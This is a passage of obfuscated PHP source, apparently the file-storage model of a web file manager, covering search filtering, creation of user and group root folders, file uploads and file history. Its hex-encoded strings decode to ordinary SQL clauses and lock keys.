$„…çò¬[1661] => 0, $„…çò¬[33] => $„…çò¬[1967] . $­ÂŞëè§); $ïÊ¬šµ = Model($„…çò¬[466])->field($„…çò¬[84])->where($‡Ù¬µ×)->select(); $ïÊ¬šµ = array_to_keyvalue($ïÊ¬šµ, $„…çò¬[12], $„…çò¬[84]); $ß‰—û— = array_unique($ïÊ¬šµ); $this->_listSearchMerge($Œßïˆüš, $Ü¦ŠÉ€İ, $¨û³Åå, $ß‰—û—); } private function _listSearchMerge(&$¹ÚÛªÈÆ, $‘’—×Å, $ˆƒŒ£’’, $ÖÚÏêöÂ) { $–Û™¤£’ =& $_SERVER[¡“ËÌ§œ]; if (!$ÖÚÏêöÂ) { return; } $ĞŸÜ˜™è = array_to_keyvalue($¹ÚÛªÈÆ[$–Û™¤£’[398]], $–Û™¤£’[12], $–Û™¤£’[440]); $òš¾ûÖ = array_diff($ÖÚÏêöÂ, $ĞŸÜ˜™è); if (!$òš¾ûÖ) { return; } $ôú¸Œ¸œ = array($–Û™¤£’[440] => array($–Û™¤£’[7], $òš¾ûÖ)); $¦÷õğ¿ = $this->field($ˆƒŒ£’’)->where($ôú¸Œ¸œ)->select(); if (!$¦÷õğ¿) { return; } $ÅÑˆô§¹ = array(); foreach ($¦÷õğ¿ as $ÀÈ³‚ôŸ) { if ($this->_listSearchFilter($ÀÈ³‚ôŸ, $‘’—×Å)) { $ÅÑˆô§¹[] = $ÀÈ³‚ôŸ; } } $¹ÚÛªÈÆ[$–Û™¤£’[398]] = array_merge($ÅÑˆô§¹, $¹ÚÛªÈÆ[$–Û™¤£’[398]]); $¹ÚÛªÈÆ[$–Û™¤£’[395]][$–Û™¤£’[396]] += count($ÅÑˆô§¹); } private function _listSearchFilter($­Œ½¶ïÙ, $Íõ¦µ† ) { $ÖÊ¾ßğï =& $_SERVER[¡“ËÌ§œ]; $ªêÙí’ = $­Œ½¶ïÙ[$ÖÊ¾ßğï[448]] == $ÖÊ¾ßğï[88]; if (!strstr($­Œ½¶ïÙ[$ÖÊ¾ßğï[549]], $ÖÊ¾ßğï[50] . $Íõ¦µ† [$ÖÊ¾ßğï[470]] . $ÖÊ¾ßğï[50])) { return !1; } if (isset($Íõ¦µ† [$ÖÊ¾ßğï[450]]) && $Íõ¦µ† [$ÖÊ¾ßğï[450]] != $ÖÊ¾ßğï[1906]) { if ($Íõ¦µ† [$ÖÊ¾ßğï[450]] == $ÖÊ¾ßğï[75] && !$ªêÙí’) { return !1; } if ($Íõ¦µ† [$ÖÊ¾ßğï[450]] != $ÖÊ¾ßğï[75] && $ªêÙí’) { return !1; } if (!strstr($­Œ½¶ïÙ[$ÖÊ¾ßğï[174]], $ÖÊ¾ßğï[50] . $Íõ¦µ† [$ÖÊ¾ßğï[450]] . $ÖÊ¾ßğï[50])) { return !1; } } if (isset($Íõ¦µ† [$ÖÊ¾ßğï[2113]]) && $Íõ¦µ† [$ÖÊ¾ßğï[2113]] < $­Œ½¶ïÙ[$ÖÊ¾ßğï[76]]) { return !1; } if (isset($Íõ¦µ† [$ÖÊ¾ßğï[2114]]) && $Íõ¦µ† [$ÖÊ¾ßğï[2114]] > $­Œ½¶ïÙ[$ÖÊ¾ßğï[76]]) { return !1; } if (isset($Íõ¦µ† [$ÖÊ¾ßğï[628]]) && $Íõ¦µ† [$ÖÊ¾ßğï[628]] != $­Œ½¶ïÙ[$ÖÊ¾ßğï[494]]) { return !1; } return !0; } public function listSearchChildren($È¶êŒ»‰, $ıÓ´ƒ = 5000) { $Óæşß =& $_SERVER[¡“ËÌ§œ]; $ï¯ÛÇ¤ = array(); $ß°òË¶¥ = $this->sourceInfo($È¶êŒ»‰); $²êëĞï = array($Óæşß[549] => array($Óæşß[412], $ß°òË¶¥[$Óæşß[549]] . $ß°òË¶¥[$Óæşß[440]] . $Óæşß[579])); $à’“åçğ = $this->field($Óæşß[76])->where($²êëĞï)->limit($ıÓ´ƒ + 1)->select(); $©µÃšªß = is_array($à’“åçğ) ? count($à’“åçğ) : 0; if ($©µÃšªß > $ıÓ´ƒ) { return $this->_listSearchChildrenNear($È¶êŒ»‰, $ıÓ´ƒ); } $ˆçúğÛ‰ = $this->field($Óæşß[440])->where($²êëĞï)->select(); $ï¯ÛÇ¤ = array_to_keyvalue($ˆçúğÛ‰, $Óæşß[12], $Óæşß[440]); return $ï¯ÛÇ¤; } private function _listSearchChildrenNear($ü‹›Ö€, $‘§êÈÀ¥) { $¿µ¡“å† =& $_SERVER[¡“ËÌ§œ]; $ıÈì«Êä = array(); $æÜŞî¬Ş = array($¿µ¡“å†[470] => $ü‹›Ö€); $î½±Ú¸û = $this->field($¿µ¡“å†[2115])->where($æÜŞî¬Ş)->select(); $×ÑˆÀ¦Ã = array_to_keyvalue(array_filter_by_field($î½±Ú¸û, $¿µ¡“å†[448], $¿µ¡“å†[88]), $¿µ¡“å†[12], $¿µ¡“å†[440]); $ıÈì«Êä = array_merge($ıÈì«Êä, array_to_keyvalue($î½±Ú¸û, $¿µ¡“å†[12], $¿µ¡“å†[440])); if (!$×ÑˆÀ¦Ã) { return $ıÈì«Êä; } $æÜŞî¬Ş = array($¿µ¡“å†[470] => array($¿µ¡“å†[7], $×ÑˆÀ¦Ã)); $î½±Ú¸û = $this->field($¿µ¡“å†[2115])->where($æÜŞî¬Ş)->limit($‘§êÈÀ¥)->select(); $ıÈì«Êä = array_merge($ıÈì«Êä, array_to_keyvalue($î½±Ú¸û, $¿µ¡“å†[12], $¿µ¡“å†[440])); $ıÈì«Êä = array_slice($ıÈì«Êä, 0, $‘§êÈÀ¥); return $ıÈì«Êä; } private function _listSearchBindPinyin($¥½Õ¤ĞÙ, &$ìé¥óÅÂ, &$Õ½¬ã¥¼) { $ÌµëÒ¹ =& $_SERVER[¡“ËÌ§œ]; if (!isset($¥½Õ¤ĞÙ[$ÌµëÒ¹[1945]]) || !$¥½Õ¤ĞÙ[$ÌµëÒ¹[1945]]) { return; } if (!Input::check($¥½Õ¤ĞÙ[$ÌµëÒ¹[1945]], $ÌµëÒ¹[347]) || strlen($¥½Õ¤ĞÙ[$ÌµëÒ¹[1945]]) < 2) { return; } $áÅÓˆ = "\x4c\x45\106\124\40\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\163\157\165\x72\143\x65\137\155\145\x74\141\40\x6d\145\164\x61\x20\157\156\40\163\157\x75\x72\143\x65\x2e\163\157\x75\162\x63\x65\111\104\40\75\x20\x6d\x65\x74\x61\56\163\157\x75\162\143\145\x49\x44"; $ó¾»ò´Ó = array(); $Õ½¬ã¥¼ = str_replace(array($ÌµëÒ¹[231], $ÌµëÒ¹[53], $ÌµëÒ¹[2116]), $ÌµëÒ¹[12], $Õ½¬ã¥¼); $Õ½¬ã¥¼ = $ÌµëÒ¹[476] . str_replace($ÌµëÒ¹[50], $ÌµëÒ¹[477], $Õ½¬ã¥¼); $µŸ Ï‡¼ = $ìé¥óÅÂ[$ÌµëÒ¹[32]]; unset($ìé¥óÅÂ[$ÌµëÒ¹[32]]); foreach ($ìé¥óÅÂ as $–Úó†”ê => $¢˜—ñ˜ı) { $ó¾»ò´Ó[$ÌµëÒ¹[476] . $–Úó†”ê] = $¢˜—ñ˜ı; } foreach ($µŸ Ï‡¼ as $ÍÛ´µû) { $ó¾»ò´Ó[] = array($ÌµëÒ¹[481] => $ÍÛ´µû, $ÌµëÒ¹[1020] => $ÌµëÒ¹[1949], array($ÌµëÒ¹[2117] => $ÍÛ´µû, $ÌµëÒ¹[2118] => array($ÌµëÒ¹[7], array($ÌµëÒ¹[503], $ÌµëÒ¹[502])))); } $this->join($áÅÓˆ); $ìé¥óÅÂ = $ó¾»ò´Ó; } private function _parseSearchWhere($òÁ×Ì¢”) { $‡Ş¯ã“ç =& $_SERVER[¡“ËÌ§œ]; $™šÍËˆœ = array(); if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[780]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[780]]) { $™šÍËˆœ[$‡Ş¯ã“ç[85]] = array($‡Ş¯ã“ç[2119], $òÁ×Ì¢”[$‡Ş¯ã“ç[780]]); } if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[781]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[781]]) { $Ô‰öô€ = array($‡Ş¯ã“ç[2120], $òÁ×Ì¢”[$‡Ş¯ã“ç[781]]); if ($™šÍËˆœ[$‡Ş¯ã“ç[85]]) { $™šÍËˆœ[$‡Ş¯ã“ç[85]] = array($™šÍËˆœ[$‡Ş¯ã“ç[85]], $Ô‰öô€, $‡Ş¯ã“ç[2121]); } else { $™šÍËˆœ[$‡Ş¯ã“ç[85]] = $Ô‰öô€; } } if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[2113]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[2113]] > 0) { $™šÍËˆœ[$‡Ş¯ã“ç[76]] = array($‡Ş¯ã“ç[2119], $òÁ×Ì¢”[$‡Ş¯ã“ç[2113]]); } if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[2114]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[2114]]) { $Ô‰öô€ = array($‡Ş¯ã“ç[2120], $òÁ×Ì¢”[$‡Ş¯ã“ç[2114]]); if ($™šÍËˆœ[$‡Ş¯ã“ç[76]]) { $™šÍËˆœ[$‡Ş¯ã“ç[76]] = array($™šÍËˆœ[$‡Ş¯ã“ç[76]], $Ô‰öô€, $‡Ş¯ã“ç[2121]); } else { $™šÍËˆœ[$‡Ş¯ã“ç[76]] = $Ô‰öô€; } } if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[628]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[628]]) { $™šÍËˆœ[] = array($‡Ş¯ã“ç[494] => $òÁ×Ì¢”[$‡Ş¯ã“ç[628]], $‡Ş¯ã“ç[492] => $òÁ×Ì¢”[$‡Ş¯ã“ç[628]], $‡Ş¯ã“ç[1020] => $‡Ş¯ã“ç[1949]); } if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[450]]) && $òÁ×Ì¢”[$‡Ş¯ã“ç[450]]) { $µŠß¹ = $òÁ×Ì¢”[$‡Ş¯ã“ç[450]]; if ($µŠß¹ == $‡Ş¯ã“ç[75]) { $™šÍËˆœ[$‡Ş¯ã“ç[448]] = 1; } else { if ($µŠß¹ == $‡Ş¯ã“ç[2122]) { $™šÍËˆœ[$‡Ş¯ã“ç[448]] = 0; } else { if ($µŠß¹) { $µŠß¹ = is_array($µŠß¹) ? $µŠß¹ : explode($‡Ş¯ã“ç[50], $µŠß¹); $™šÍËˆœ[$‡Ş¯ã“ç[450]] = array($‡Ş¯ã“ç[456], $µŠß¹); $™šÍËˆœ[$‡Ş¯ã“ç[448]] = 0; } } } } $this->_parseSearchParent($òÁ×Ì¢”, $™šÍËˆœ); if (isset($òÁ×Ì¢”[$‡Ş¯ã“ç[1945]]) && trim($òÁ×Ì¢”[$‡Ş¯ã“ç[1945]])) { $¡Õ¢Ã‹ = trim($òÁ×Ì¢”[$‡Ş¯ã“ç[1945]]); $Ş‚Õ«Ÿš = explode($‡Ş¯ã“ç[53], $¡Õ¢Ã‹); if (strlen($¡Õ¢Ã‹) > 2 && (substr($¡Õ¢Ã‹, 0, 1) == $‡Ş¯ã“ç[118] && substr($¡Õ¢Ã‹, -1) == $‡Ş¯ã“ç[118]) || substr($¡Õ¢Ã‹, 0, 1) == $‡Ş¯ã“ç[58] && substr($¡Õ¢Ã‹, -1) == $‡Ş¯ã“ç[58]) { $¡Õ¢Ã‹ = substr($¡Õ¢Ã‹, 1, -1); $Ş‚Õ«Ÿš = array($¡Õ¢Ã‹); } $™šÍËˆœ[$‡Ş¯ã“ç[32]] = array(array($‡Ş¯ã“ç[578], $‡Ş¯ã“ç[1947] . $¡Õ¢Ã‹ . $‡Ş¯ã“ç[1947])); if (count($Ş‚Õ«Ÿš) > 1) { $™šÍËˆœ[$‡Ş¯ã“ç[32]] = array(); foreach ($Ş‚Õ«Ÿš as $Ê«êÊ”á) { if (!trim($Ê«êÊ”á)) { continue; } $™šÍËˆœ[$‡Ş¯ã“ç[32]][] = array($‡Ş¯ã“ç[578], $‡Ş¯ã“ç[1947] . trim($Ê«êÊ”á) . $‡Ş¯ã“ç[1947]); } } } return $™šÍËˆœ; } private function _parseSearchParent($ï™¤óÀ, &$üß®Àã€) { $ôìØâ±Æ =& $_SERVER[¡“ËÌ§œ]; if (!isset($ï™¤óÀ[$ôìØâ±Æ[470]]) || !$ï™¤óÀ[$ôìØâ±Æ[470]]) { return; } $˜ªìÜî = $this->pathInfo($ï™¤óÀ[$ôìØâ±Æ[470]]); $å¿½ÓÓÜ = $˜ªìÜî[$ôìØâ±Æ[470]] . $ôìØâ±Æ[12] === $ôìØâ±Æ[198]; $Ôç©‚Š» = $˜ªìÜî[$ôìØâ±Æ[449]] == $ôìØâ±Æ[543]; if ($˜ªìÜî[$ôìØâ±Æ[560]] == $ôìØâ±Æ[561]) { $£ÀÏûÄ = $this->sourceInfo($ï™¤óÀ[$ôìØâ±Æ[470]]); $˜ªìÜî[$ôìØâ±Æ[549]] = $£ÀÏûÄ[$ôìØâ±Æ[549]]; } $üß®Àã€[$ôìØâ±Æ[618]] = array($ôìØâ±Æ[578], $˜ªìÜî[$ôìØâ±Æ[549]] . $ï™¤óÀ[$ôìØâ±Æ[470]] . $ôìØâ±Æ[579]); $¿Æ¬á¿â = isset($ï™¤óÀ[$ôìØâ±Æ[1810]]) && in_array($ôìØâ±Æ[543], $ï™¤óÀ[$ôìØâ±Æ[1810]]); if (!$¿Æ¬á¿â || !$Ôç©‚Š» || !$å¿½ÓÓÜ || !$˜ªìÜî[$ôìØâ±Æ[451]]) { return; } if (!AuthModel::authCheckRoot($˜ªìÜî[$ôìØâ±Æ[451]][$ôìØâ±Æ[452]])) { return; } $î«¡–åù = $˜ªìÜî[$ôìØâ±Æ[534]] . $ôìØâ±Æ[12]; if ($î«¡–åù == $ôìØâ±Æ[88]) { unset($üß®Àã€[$ôìØâ±Æ[618]]); $üß®Àã€[$ôìØâ±Æ[449]] = self::TYPE_GROUP; return; } $É•åÃÉ = Model($ôìØâ±Æ[550])->groupChildrenAll($î«¡–åù); $¶„Ûİ˜è = count($É•åÃÉ); if ($¶„Ûİ˜è <= 1) { return; } $„— ò¾ = array($ôìØâ±Æ[470] => 0, $ôìØâ±Æ[449] => self::TYPE_GROUP, $ôìØâ±Æ[534] => array($ôìØâ±Æ[7], $É•åÃÉ)); $€œõğé¶ = $this->field($ôìØâ±Æ[2123])->where($„— ò¾)->limit($¶„Ûİ˜è)->select(); $üß®Àã€[$ôìØâ±Æ[618]] = array(); foreach ($€œõğé¶ as $ã¢²óäÓ) { $üß®Àã€[$ôìØâ±Æ[618]][] = array($ôìØâ±Æ[578], $ôìØâ±Æ[559] . $ã¢²óäÓ[$ôìØâ±Æ[440]] . $ôìØâ±Æ[579]); } $üß®Àã€[$ôìØâ±Æ[618]][] = $ôìØâ±Æ[1949]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ÿş˜·èŠ) { $«ÊïºÑÂ =& $_SERVER[¡“ËÌ§œ]; $–ĞñÊÅ = Model($«ÊïºÑÂ[542])->where(array($«ÊïºÑÂ[1652] => $Ÿş˜·èŠ))->find(); $ÍıÛÖ‰ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ÿş˜·èŠ, $–ĞñÊÅ[$«ÊïºÑÂ[32]]); $this->userDesktopAdd($ÍıÛÖ‰ê); return $ÍıÛÖ‰ê; } public function userDesktopAdd($ÌËÊÆÆÅ) { $–¦úƒ„ñ =& $_SERVER[¡“ËÌ§œ]; $éˆëÇÏ› = LNG($–¦úƒ„ñ[2124]); $Ëæ‘™ø» = $this->mkdir($ÌËÊÆÆÅ, $éˆëÇÏ›); $this->metaSet($Ëæ‘™ø», $–¦úƒ„ñ[2125], $–¦úƒ„ñ[88]); $this->metaSet($ÌËÊÆÆÅ, $–¦úƒ„ñ[2126], $Ëæ‘™ø»); } public function userPathSafeAdd($¢ÕæÇîà) { $°Êµâ¾¬ =& $_SERVER[¡“ËÌ§œ]; $‡ÏÀßöå = Model($°Êµâ¾¬[542])->getInfoFull($¢ÕæÇîà); if (!$‡ÏÀßöå) { return !1; } if (_get($‡ÏÀßöå, $°Êµâ¾¬[564])) { return $‡ÏÀßöå[$°Êµâ¾¬[504]][$°Êµâ¾¬[2127]]; } $ˆ´Ú¦£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¢ÕæÇîà, $°Êµâ¾¬[2128], $°Êµâ¾¬[471]); Model($°Êµâ¾¬[542])->metaSet($¢ÕæÇîà, $°Êµâ¾¬[2127], $ˆ´Ú¦£); $this->metaSet($ˆ´Ú¦£, $°Êµâ¾¬[2129], $¢ÕæÇîà); return $ˆ´Ú¦£; } public function groupRootAdd($ëë²ˆÇ) { $™Ğö¼Æ’ =& $_SERVER[¡“ËÌ§œ]; $ÑÖ•ó¡ = Model($™Ğö¼Æ’[550])->where(array($™Ğö¼Æ’[1939] => $ëë²ˆÇ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ëë²ˆÇ, $ÑÖ•ó¡[$™Ğö¼Æ’[32]]); } public function systemRootPathAdd($İ®ÔÌÏÉ) { if ($İ®ÔÌÏÉ != $_SERVER[¡“ËÌ§œ][572]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $İ®ÔÌÏÉ); } public function userRootRemove($ ƒü”°) { $Ô˜ÆÍ²ã = $this->targetSourceRoot(SourceModel::TYPE_USER, $ ƒü”°, !0); foreach ($Ô˜ÆÍ²ã as $ÑÍşË) { if (!$ÑÍşË) { continue; } $this->remove($ÑÍşË[$_SERVER[¡“ËÌ§œ][440]], !1); } } public function groupRootRemove($”ªíÁø) { $ûßøÙøÂ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $”ªíÁø); if (!$ûßøÙøÂ) { return; } $this->remove($ûßøÙøÂ[$_SERVER[¡“ËÌ§œ][440]], !1); } private function _mkdirRoot($ÊâòÜÂ”, $ĞäÜ‹ÊÀ, $¬ãßŞÁ, $é¬Ùşñğ = '') { $®ó˜Àç =& $_SERVER[¡“ËÌ§œ]; $ç°ÛÁ½ = defined($®ó˜Àç[2072]) ? USER_ID : 0; $Êéë­Òü = array($®ó˜Àç[439] => 0, $®ó˜Àç[614] => $ÊâòÜÂ”, $®ó˜Àç[615] => $ĞäÜ‹ÊÀ, $®ó˜Àç[612] => 1, $®ó˜Àç[616] => $ç°ÛÁ½, $®ó˜Àç[617] => $ç°ÛÁ½, $®ó˜Àç[613] => $é¬Ùşñğ, $®ó˜Àç[618] => $®ó˜Àç[559], $®ó˜Àç[468] => 0, $®ó˜Àç[583] => 0, $®ó˜Àç[507] => 0, $®ó˜Àç[619] => $®ó˜Àç[12]); if ($¢ŠîŞº§ = $this->where($Êéë­Òü)->find()) { return $¢ŠîŞº§[$®ó˜Àç[440]]; } $ŸÊí¡ğÒ = "\x4d\157\144\x65\x6c\123\x6f\165\162\x63\x65\56\155\153\x64\x69\x72\122\x6f\x6f\x74\x2e{$ÊâòÜÂ”}\56{$ĞäÜ‹ÊÀ}\56" . $¬ãßŞÁ; CacheLock::lock($ŸÊí¡ğÒ); $Êéë­Òü[$®ó˜Àç[32]] = $¬ãßŞÁ; $øÃÖ¨Ÿó = $this->add($Êéë­Òü); $®ûÎû„ı = array($®ó˜Àç[620] => short_id($øÃÖ¨Ÿó)); $this->where(array($®ó˜Àç[455] => $øÃÖ¨Ÿó))->save($®ûÎû„ı); CacheLock::unlock($ŸÊí¡ğÒ); return $øÃÖ¨Ÿó; } private function targetSourceRoot($ëæêêá, $‹Ì‡Ââ, $ØßìÓÌã = false) { $˜á‡’ç¢ =& $_SERVER[¡“ËÌ§œ]; $Æı‹éÚ = array($˜á‡’ç¢[439] => 0, $˜á‡’ç¢[614] => $ëæêêá, $˜á‡’ç¢[615] => $‹Ì‡Ââ); if ($ØßìÓÌã) { $¬íĞøÇÈ = $this->where($Æı‹éÚ)->select(); return $¬íĞøÇÈ ? $¬íĞøÇÈ : array(); } $‘˜Ù€Ãø = $this->where($Æı‹éÚ)->find(); return $‘˜Ù€Ãø ? $‘˜Ù€Ãø : array(); } public function sourceRootGroup($òÖ‹»˜Ã) { $Ÿíş€ ğ =& $_SERVER[¡“ËÌ§œ]; if (is_string($òÖ‹»˜Ã)) { $òÖ‹»˜Ã = array($òÖ‹»˜Ã); } $‰»ËÎƒ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $òÖ‹»˜Ã, $Ÿíş€ ğ[189]); $Ãµë©º¶ = array($Ÿíş€ ğ[398] => $‰»ËÎƒ, $Ÿíş€ ğ[395] => array($Ÿíş€ ğ[778] => count($òÖ‹»˜Ã))); $this->_listDataApply($Ãµë©º¶[$Ÿíş€ ğ[398]]); $this->_listMake($Ãµë©º¶); return array_to_keyvalue($Ãµë©º¶[$Ÿíş€ ğ[82]], $Ÿíş€ ğ[534]); } public function mkfile($ÉÜ’½½É, $èŞøãÕ», $ àÏÚ‚ = '', $•§èÀÜÛ = REPEAT_RENAME) { $Ç¢–ïğ =& $_SERVER[¡“ËÌ§œ]; $Ï·æß¹• = Model($Ç¢–ïğ[639])->addFileByContent($ àÏÚ‚, $èŞøãÕ»); return $this->_createFileCall($ÉÜ’½½É, $èŞøãÕ», $Ï·æß¹•, $•§èÀÜÛ, $Ç¢–ïğ[1364]); } public function addFile($±„»è‚í, $°Ó‚œï, $ĞÛµ›Şµ, $Åãì »“ = false, $¯ÕáÑğË = REPEAT_RENAME) { $“îÑ£âÆ = Model($_SERVER[¡“ËÌ§œ][639])->addFile($°Ó‚œï, $ĞÛµ›Şµ, $Åãì »“); return $this->_createFileCall($±„»è‚í, $ĞÛµ›Şµ, $“îÑ£âÆ, $¯ÕáÑğË); } public function addFileByFileID($×ÈÆ¹—ê, $•Ç©ÜæÊ, $Ş¡È‡˜¤, $Ü—›İ£ı = REPEAT_RENAME) { $ì’‡´´ =& $_SERVER[¡“ËÌ§œ]; $£“ú»•¡ = Model($ì’‡´´[639])->find($•Ç©ÜæÊ); Model($ì’‡´´[639])->linkAdd($•Ç©ÜæÊ); return $this->_createFileCall($×ÈÆ¹—ê, $Ş¡È‡˜¤, $£“ú»•¡, $Ü—›İ£ı); } public function addFileByRemote($Ü÷±¬›š, $¾¡İ—», $±ËŞ˜“, $¹ÉíŞÖ¬ = array(), $ÀŒôÎËì = REPEAT_RENAME) { $Üáò–½± = Model($_SERVER[¡“ËÌ§œ][639])->addFileByRemote($¾¡İ—», $±ËŞ˜“, $¹ÉíŞÖ¬); return $this->_createFileCall($Ü÷±¬›š, $±ËŞ˜“, $Üáò–½±, $ÀŒôÎËì); } private function _createFileCall($ş‚Æ¯Ï, $ÉˆÔ¡ñĞ, $Ü¢´ Øû, $ÏĞ¦À±Ğ, $èñÓØ¨ = "\165\x70\x6c\157\141\144") { $™’İÙ‹½ =& $_SERVER[¡“ËÌ§œ]; $õ°ß´êí = !1; $this->setMasterDB(); $this->lockWriteStart($ş‚Æ¯Ï, $ÉˆÔ¡ñĞ); $îùµª’ = $this->fileNameExist($ş‚Æ¯Ï, $ÉˆÔ¡ñĞ); $ºÆÉÊíü = $this->_createFile($ş‚Æ¯Ï, $ÉˆÔ¡ñĞ, $Ü¢´ Øû, $ÏĞ¦À±Ğ, $õ°ß´êí); if (!$õ°ß´êí) { Model($™’İÙ‹½[509])->remove($Ü¢´ Øû[$™’İÙ‹½[506]]); } if ($õ°ß´êí && $ºÆÉÊíü && $ºÆÉÊíü != $îùµª’) { Model($™’İÙ‹½[2097])->eventCreate($ºÆÉÊíü, $èñÓØ¨); } $this->lockWriteEnd($ş‚Æ¯Ï, $ÉˆÔ¡ñĞ); return $ºÆÉÊíü; } public function mkdir($øÔ¦ŒŞ¨, $Áä³é³, $À‹ûŒ¢§ = REPEAT_SKIP) { $çôô×‡Œ =& $_SERVER[¡“ËÌ§œ]; $this->setMasterDB(); $ş¼³÷àÎ = $this->sourceInfo($øÔ¦ŒŞ¨); if (!$ş¼³÷àÎ) { return !1; } $this->lockWriteStart($øÔ¦ŒŞ¨, $Áä³é³); if ($À‹ûŒ¢§ !== !1) { $šï£åø = $this->fileNameExist($øÔ¦ŒŞ¨, $Áä³é³); if ($šï£åø && $À‹ûŒ¢§ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($øÔ¦ŒŞ¨, $Áä³é³); return $šï£åø; } $Áä³é³ = $this->fileNameAuto($øÔ¦ŒŞ¨, $Áä³é³, $À‹ûŒ¢§); } $ñ¢³Ä¤ƒ = array($çôô×‡Œ[612] => 1, $çôô×‡Œ[458] => $Áä³é³, $çôô×‡Œ[613] => $çôô×‡Œ[12], $çôô×‡Œ[507] => 0, $çôô×‡Œ[583] => 0); $”Ú‰íäÆ = $this->_addSource($ñ¢³Ä¤ƒ, $ş¼³÷àÎ); Model($çôô×‡Œ[2097])->eventCreate($”Ú‰íäÆ, $çôô×‡Œ[1365]); $this->lockWriteEnd($øÔ¦ŒŞ¨, $Áä³é³); return $”Ú‰íäÆ; } public function listSourceRoot($Ÿå’”Öö, $€íƒşÜ, $ÑÓ´†€Î = "\163\157\165\162\x63\145\x49\x44\x2c\x74\141\162\147\145\x74\111\x44\54\x73\151\172\x65") { $øãÓÇ¨ó =& $_SERVER[¡“ËÌ§œ]; $ÎıË ­™ = $øãÓÇ¨ó[407]; $Ò¶ÙÖíš = array(); $ÜÉ¨³Ç = 1024 * 50; $£Ú×à…ü = is_array($£Ú×à…ü) ? $£Ú×à…ü : array(); $¶·í´Áª = count($€íƒşÜ); $¡ªƒÔ£Ä = $this->tablePrefix . $øãÓÇ¨ó[2130]; for ($áÅÏÓù¦ = 0; $áÅÏÓù¦ < $¶·í´Áª; $áÅÏÓù¦++) { $§ñóÙ = $€íƒşÜ[$áÅÏÓù¦]; $ÎıË ­™ .= "\123\x45\114\x45\x43\124\x20\x2a\x20\106\x52\x4f\x4d\x20\50\x53\105\114\x45\x43\124\40{$ÑÓ´†€Î}\x20\x46\x52\117\x4d\40\140{$¡ªƒÔ£Ä}\140\40\127\110\105\122\x45\40"; $ÎıË ­™ .= "\x60\160\141\162\x65\156\x74\111\104\x60\x3d\60\40\101\116\104\40\x60\164\141\162\147\x65\164\x49\x44\x60\75{$§ñóÙ}\40\101\x4e\104\x20\140\164\141\162\x67\x65\x74\124\171\160\x65\x60\x3d{$Ÿå’”Öö}\40\141\156\x64\x20\146\x69\x6c\x65\124\171\160\145\x3d\47\47\x20\154\x69\x6d\x69\x74\40\x31\x29\x20\141\163\40\164\142\x5f{$áÅÏÓù¦}\40\x55\116\x49\117\116\x20\x41\114\114\x20"; if ((strlen($ÎıË ­™) >= $ÜÉ¨³Ç || $áÅÏÓù¦ == $¶·í´Áª - 1) && $ÎıË ­™) { $ÎıË ­™ = substr($ÎıË ­™, 0, -strlen($øãÓÇ¨ó[1058])); $¹±®ğ­Ä = $this->query($ÎıË ­™); $ÎıË ­™ = $øãÓÇ¨ó[12]; $Ò¶ÙÖíš = array_merge($Ò¶ÙÖíš, $¹±®ğ­Ä); } } return $Ò¶ÙÖíš; } private function _createFile($›şƒçó¬, $…Œú¼š¿, $Ï»…ê¢†, $©ÀƒÛ¢, &$Ğã¬ö¦) { $ÎùÂßÅ¬ =& $_SERVER[¡“ËÌ§œ]; $´šÚöå¤ = $this->sourceInfo($›şƒçó¬); if (!$Ï»…ê¢† || !$´šÚöå¤) { return !1; } if ($©ÀƒÛ¢ !== !1) { $¡Ìó¨¤â = $this->fileNameExist($›şƒçó¬, $…Œú¼š¿); } $Ğã¬ö¦ = !0; if ($©ÀƒÛ¢ && $¡Ìó¨¤â) { if ($©ÀƒÛ¢ == REPEAT_SKIP) { $Ğã¬ö¦ = !1; return $¡Ìó¨¤â; } else { if ($©ÀƒÛ¢ == REPEAT_REPLACE) { $üóâƒÀõ = $this->sourceInfo($¡Ìó¨¤â); $­ªÂ»’ = $this->fileHistory($üóâƒÀõ, $Ï»…ê¢†[$ÎùÂßÅ¬[506]], $Ï»…ê¢†[$ÎùÂßÅ¬[76]]); if (!$­ªÂ»’) { $Ğã¬ö¦ = !1; } else { $this->folderSizeReset($›şƒçó¬); } return $¡Ìó¨¤â; } else { $…Œú¼š¿ = $this->fileNameAuto($›şƒçó¬, $…Œú¼š¿, $©ÀƒÛ¢, !1); } } } $ì°­ƒæç = array($ÎùÂßÅ¬[612] => 0, $ÎùÂßÅ¬[458] => $…Œú¼š¿, $ÎùÂßÅ¬[613] => substr(get_path_ext($…Œú¼š¿), 0, 10), $ÎùÂßÅ¬[507] => $Ï»…ê¢†[$ÎùÂßÅ¬[506]], $ÎùÂßÅ¬[583] => $Ï»…ê¢†[$ÎùÂßÅ¬[76]]); $‰«´¬Ú = $this->_addSource($ì°­ƒæç, $´šÚöå¤); $this->folderSizeReset($›şƒçó¬, intval($ì°­ƒæç[$ÎùÂßÅ¬[76]])); return $‰«´¬Ú; } protected function fileHistory($áè½Áî, $Ÿ¶¯ï£®, $äá¶êì£) { $Ë²ºªÇğ =& $_SERVER[¡“ËÌ§œ]; if ($áè½Áî[$Ë²ºªÇğ[506]] == $Ÿ¶¯ï£®) { return !1; } $this->checkLock($áè½Áî[$Ë²ºªÇğ[440]], $Ÿ¶¯ï£®); Model($Ë²ºªÇğ[2131])->addHistory($áè½Áî); $õ¾åà»ö = array($Ë²ºªÇğ[617] => USER_ID, $Ë²ºªÇğ[462] => time(), $Ë²ºªÇğ[506] => $Ÿ¶¯ï£®, $Ë²ºªÇğ[76] => $äá¶êì£); 